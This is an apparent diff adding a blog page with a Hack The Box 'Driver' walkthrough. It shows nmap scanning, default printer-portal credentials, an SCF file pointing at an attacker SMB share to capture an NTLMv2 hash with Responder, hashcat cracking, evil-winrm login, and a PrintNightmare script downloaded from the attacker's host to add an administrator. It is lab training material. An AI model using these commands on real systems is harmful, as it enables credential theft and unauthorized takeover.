@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Driver Hackthebox writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren&amp;rsquo;t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service &amp;ldquo;spooler&amp;rdquo; and add a user in the administrator group.
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Driver Hackthebox writeup">
+    <meta name="twitter:description" content="In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren&amp;rsquo;t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service &amp;ldquo;spooler&amp;rdquo; and add a user in the administrator group.
+">
+    <meta name="twitter:image" content="/media/Driver/20220226105919.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Driver Hackthebox writeup">
+  <meta property="og:description" content="In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren&amp;rsquo;t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service &amp;ldquo;spooler&amp;rdquo; and add a user in the administrator group.
+">
+  <meta property="og:url" content="/post/driver/">
+  <meta property="og:image" content="/media/Driver/20220226105919.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/driver/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Driver Hackthebox writeup</h1>
+      <p class="post-meta">@0xMesbaha · Feb 25, 2022 · 4 min read</p>
+    </header>
+    <article class="post-content"><p>In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture
+the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in
+except the smb shares aren&rsquo;t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service &ldquo;spooler&rdquo; and add a user in the administrator group.</p>
+<h2 id="scanning-">Scanning :</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -T <span style="color:#ae81ff">4</span> -A -sV 10.10.11.106  -oN nmap_intial.txt
+</code></pre></div><p>output :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+|_  Basic realm<span style="color:#f92672">=</span>MFP Firmware Update Center. Please enter password <span style="color:#66d9ef">for</span> admin
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn<span style="color:#ae81ff">\&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h17m43s, deviation: 0s, median: 7h17m43s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+</code></pre></div><p>we can also run full port scan and will get  :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+</code></pre></div><p>we have this port <strong>5985</strong> open , searching about it will find <a href="https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm">this</a> Hacktricks post which we may utilize later .</p>
+<h2 id="enumeration">Enumeration:</h2>
+<p>we can start by visiting the web page and it will ask us for a username:password for  MFP firmware update center .</p>
+<p><img src="/media/Driver/20220226110700.png" alt="image"></p>
+<p>searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is <strong>&ldquo;admin:admin&rdquo;</strong></p>
+<p>using them will login successfully :</p>
+<p><img src="/media/Driver/20220226111149.png" alt="image"></p>
+<ul>
+<li>
+<p>we can add &ldquo;driver.htb&rdquo; to the  <code>/etc/hosts</code> and start fuzzing for any Vhosts but will find none.</p>
+</li>
+<li>
+<p>let&rsquo;s navigate around this site will find option Firmware Updates is working and asking for updating firmware</p>
+</li>
+</ul>
+<p><img src="/media/Driver/20220226111320.png" alt="image"></p>
+<ul>
+<li>
+<p>we should now think about uploading some malicious file to gain a reverse shell , however it won&rsquo;t work.</p>
+</li>
+<li>
+<p>we can enumerate SMB that we have found earlier maybe will give us a lead</p>
+</li>
+<li>
+<p>ACCESS_DENIED  from  <code>smbclient -L //driver.htb</code></p>
+</li>
+<li>
+<p>it seems SMB is running  for the printer that is shared among the network</p>
+</li>
+</ul>
+<h3 id="smb-authentication-">SMB authentication :</h3>
+<ul>
+<li>according to Microsoft Documentation :</li>
+</ul>
+<pre><code>NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.
+</code></pre><ul>
+<li>so if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with <a href="https://github.com/lgandx/Responder">Responder</a> tool.</li>
+</ul>
+<h3 id="exploitation-">Exploitation :</h3>
+<ul>
+<li>searching for &ldquo;smb share and printer firmware update exploit&rdquo; will find this blog  <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a></li>
+<li>so creating the payload :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span>
+Command<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+IconFile<span style="color:#f92672">=</span><span style="color:#ae81ff">\\</span>&lt;ip&gt;<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\M</span>esbaha.ico
+<span style="color:#f92672">[</span>Taskbar<span style="color:#f92672">]</span>
+Command<span style="color:#f92672">=</span>ToggleDesktop
+</code></pre></div><p>and name it as <code>&quot;@hack.scf&quot;</code> and before uploading it run Responder to capture the hash (hopefully):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo responder -I tun0 -rdwv
+</code></pre></div><p>GREAT we have NTLMv2 hash now  :</p>
+<p><img src="/media/Driver/20220226114609.png" alt="image"></p>
+<p>now we can try to crack it with hashcat  :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">5600</span> tony_hash  /usr/share/wordlists/rockyou.txt
+</code></pre></div><p><img src="/media/Driver/20220226114733.png" alt="image"></p>
+<p>so we have username and password , now How can we login ?</p>
+<h2 id="foothold-">Foothold :</h2>
+<ul>
+<li>Most of the <strong>impacket</strong> tools that  takes username:password and try to login depends on SMB shares (i.e : ADMIN$ and C$) and hence they are not accessible they won&rsquo;t work .</li>
+<li>Remember the port we have found in the full port scan ?</li>
+<li>reading the blog article i have mentioned above</li>
+</ul>
+<pre><code>If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)
+</code></pre><ul>
+<li>and they mentioned tool : <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> that can help us do this</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./evil-winrm.rb -u tony -p liltony -i driver.htb
+</code></pre></div><ul>
+<li>and the user.txt is in tony&rsquo;s Desktop</li>
+</ul>
+<p><img src="/media/Driver/20220226115238.png" alt="image"></p>
+<h2 id="privilege-escalation-">Privilege escalation :</h2>
+<ul>
+<li>you can start uploading Winpeas and follow the output but i will try first some manual checks</li>
+<li>first we know this Box is about printers and drivers maybe we find some exploit that way</li>
+</ul>
+<p><img src="/media/Driver/20220226115603.png" alt="image"></p>
+<ul>
+<li>in the Microsoft post is says we can run <code>Get-Service -Name Spooler </code> to check if it is running , and it is running</li>
+</ul>
+<p><img src="/media/Driver/20220226115710.png" alt="image"></p>
+<ul>
+<li>Hence the service is running indeed we can try to exploit it and see if it works  , there is this great one <a href="https://github.com/JohnHammond/CVE-2021-34527">here</a> that we can try</li>
+<li>we can try to upload it then it will add for us a new user in Administrator group</li>
+<li>from machine side we can download the script from our http server with :</li>
+<li><strong>note</strong> make sure you are in a writable directory</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Invoke-WebRequest -Uri http://10.10.16.4:8888/CVE-2021-34527.ps1 -OutFile CVE.ps1
+</code></pre></div><ul>
+<li>running the exploit :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Import-Module .\CVE.ps1
+Invoke-Nightmare -NewUser <span style="color:#e6db74">&#34;0xMesbaha&#34;</span> -NewPassword <span style="color:#e6db74">&#34;supersecretpassword123&#34;</span>
+</code></pre></div><p><img src="/media/Driver/20220226120617.png" alt="image"></p>
+<p>and our new user has been added we can try to login with &ldquo;evil-winrm&rdquo; as well :</p>
+<p><img src="/media/Driver/20220226120835.png" alt="image"></p>
+<p>and if we run <code>net user &lt;user_added&gt;</code> will find :</p>
+<p><img src="/media/Driver/20220226120902.png" alt="image"></p>
+<p>the  root flag is at Administrator Desktop .</p>
+<h2 id="pwned">Pwned</h2></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+        
+          <li><a href="/tags/print-nigthmare"><span class="tag">Print Nigthmare</span></a></li>
+        
+          <li><a href="/tags/firmware"><span class="tag">Firmware</span></a></li>
+        
+          <li><a href="/tags/evil-winrm"><span class="tag">Evil-Winrm</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
